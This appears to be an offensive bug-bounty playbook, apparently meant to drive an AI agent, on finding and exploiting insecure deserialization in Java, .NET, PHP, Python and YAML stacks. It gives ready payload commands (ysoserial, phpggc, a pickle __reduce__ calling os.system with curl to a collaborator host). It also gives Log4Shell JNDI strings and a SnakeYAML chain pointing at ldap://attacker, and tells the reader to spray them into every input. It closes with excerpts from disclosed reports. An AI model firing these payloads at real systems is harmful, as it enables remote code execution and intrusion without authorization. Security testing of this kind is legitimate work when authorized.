---
name: hunt-deserialization
description: Insecure deserialization hunting — byte-fingerprint detection (Java AC ED 00 05/rO0A, Python pickle, PHP O:8), OOB-first confirmation philosophy, Apache Shiro rememberMe default key, .NET ViewState (signed vs encrypted, machineKey recovery), Log4Shell JNDI sweep, gadget chain payloads (ysoserial, phpggc, SnakeYAML), sink detection greps. Use when Content-Type application/x-java-serialized-object, rememberMe=, __VIEWSTATE, or deserialization sinks (unserialize, pickle.loads, yaml.load) are found. Trigger keywords: deserialization, gadget chain, ysoserial, phpggc, Log4Shell, ViewState, Shiro, SnakeYAML.
---

# Insecure Deserialization — Deep Hunting

## THE GATE — Fingerprint Bytes First
| Format | Signature |
|---|---|
| Java serialized | hex `AC ED 00 05` / base64 `rO0A` |
| Python pickle | `\x80\x04` |
| PHP | `O:8:"stdClass":...` |
| YAML (SnakeYAML) | `!!javax.script.ScriptEngineManager` |

## Detection-First Philosophy
Use OOB payloads (`curl http://COLLAB/pwn`) to confirm execution **before** crafting full chains — one callback = Critical PoC even when blind.

## Named Sinks
- **Apache Shiro**: `rememberMe` cookie with *default* AES key → `shiro_exploit.py`.
- **.NET ViewState**: check for `__VIEWSTATE` without `__VIEWSTATEMAC` (unsigned); recover `<machineKey>` from web.config disclosure → `ysoserial.net -p ViewState -g TypeConfuseDelegate` → RCE as AppPool identity.
- **Log4Shell**: test JNDI in *every* user-controlled input (headers, body fields) with `\${jndi:dns://COLLAB/x}` and `ldap://`.
- **YAML sinks**: `yaml.load` (no safe Loader) in Ruby/Python; SnakeYAML `new Yaml()`.

## Key Payloads
- Java: `java -jar ysoserial-all.jar CommonsCollections6 'cmd' | base64`
- Python: `__reduce__` → `os.system('curl http://COLLAB/pickle-rce')`
- PHP: `phpggc Laravel/RCE5 system id | base64`
- SnakeYAML bypass: `!!com.sun.rowset.JdbcRowSetImpl` + `dataSourceName: 'ldap://attacker/a'`

## Detection Endpoints
`/remoting/`, `/invoker/`, `/wls-wsat/`, `/jmx-console/`; grep `unserialize(`, `Marshal.load`, `pickle.loads`, `yaml.load`.

## Validation
DNS/HTTP callback from Collaborator, or command output in response; otherwise not confirmed. Always Critical when real.

## Common Mistakes
Sending blind payloads without an OOB listener up; assuming deserialization without byte-fingerprint; forgetting YAML/XML/JSON-processing stacks are deserialization sinks; treating file-write-only as RCE.

## PARAMETER COVERAGE — every input that reaches a parser (MANDATORY)
The #1 miss: testing only the obvious `rememberMe` cookie/`__VIEWSTATE`/
serialized-body field and skipping the rest. Deserialization hides in ANY
input a parser touches — cookies, headers, every body field, file uploads,
URL params, and format-converter inputs.

1. **Enumerate** every input surface on deserialization-prone stacks
   (Java/.NET/PHP/Ruby/Node/YAML/XML/JSON): all cookies (`rememberMe`,
   `__VIEWSTATE`+`__VIEWSTATEMAC`, session-carried blobs), headers
   (`User-Agent`/custom `X-*` in Log4Shell-class logging, `Content-Type`),
   every JSON/YAML/XML body key, upload fields (phar/XML/parsed formats), URL
   params, and any `format=`/`serializer=` selection param.
2. **Byte-fingerprint each serialized field** (Java `rO0A`/`AC ED 00 05`,
   Python `\x80\x04`, PHP `O:8:`, YAML `!!`) before crafting chains.
3. **Sweep each input with OOB-first payloads** (Collaborator JNDI/URL/DNS)
   — a callback is a Critical PoC even when blind. Log4Shell: `\${jndi:dns://
   COLLAB/x}` in EVERY header and body field. ViewState: unsigned-without-MAC
   on every form. Shiro: `rememberMe` on every session.
4. **Format-converter inputs**: file uploads parsed into objects (XML, YAML,
   EXIF, phar archives), CSV/import → object binding, PDF/HTML renderers.
5. **Re-sweep per auth context and content-type** (JSON vs XML vs YAML parser
   selection).
6. **Track** `endpoint → input → fingerprint → OOB?` in the journal with
   unique Collaborator sub-tags per input; every unlogged input = gap.

## FIELD DATA — mined from HackerOne disclosed reports (10k-report corpus)

### Class: deserialization — 37 disclosed H1 reports (27 High/Critical)

**Parameters seen in real findings** (recurring; test each on every endpoint):

- `type`
- `qid`
- `scoretype`
- `dag_id`

**Representative finding shapes** (real report titles, genericized — use as test-case ideas, not templates):

- **[critical] Attacker can add arbitrary data to the blockchain without paying gas** (Deserialization of Untrusted Data)
  - Signal: **Summary:** Due to a missing sanity check in Transaction::rlpParse, an attacker can append arbitrary RLP-encoded data to the end of an otherwise valid transaction, and that data w
- **[critical] Remote Code Execution through Deserialization Attack in OwnBackup app.** (Deserialization of Untrusted Data)
  - Signal: I found a deserialization vulnerability in the [OwnBackup](https://marketplace.owncloud.com/apps/ownbackup) app, this vulnerability allows to execute remote code in the server. An 
- **[critical] RCE on Wordpress website** (Deserialization of Untrusted Data)
  - Signal: There is a trivial to exploit Remote Code Execution on nextcloud.com due to unserializing user input. # Proof of concept The following command will execute the `system('id')` comma
- **[critical] Remote Code Execution (RCE) in a DoD website** (Deserialization of Untrusted Data)
  - Signal: SUMMARY: ==================== This report describes a vulnerability similar to that described in my other reports #329376, #329397, #329399 The DoD **`https://████/psc/EXPROD/`** W

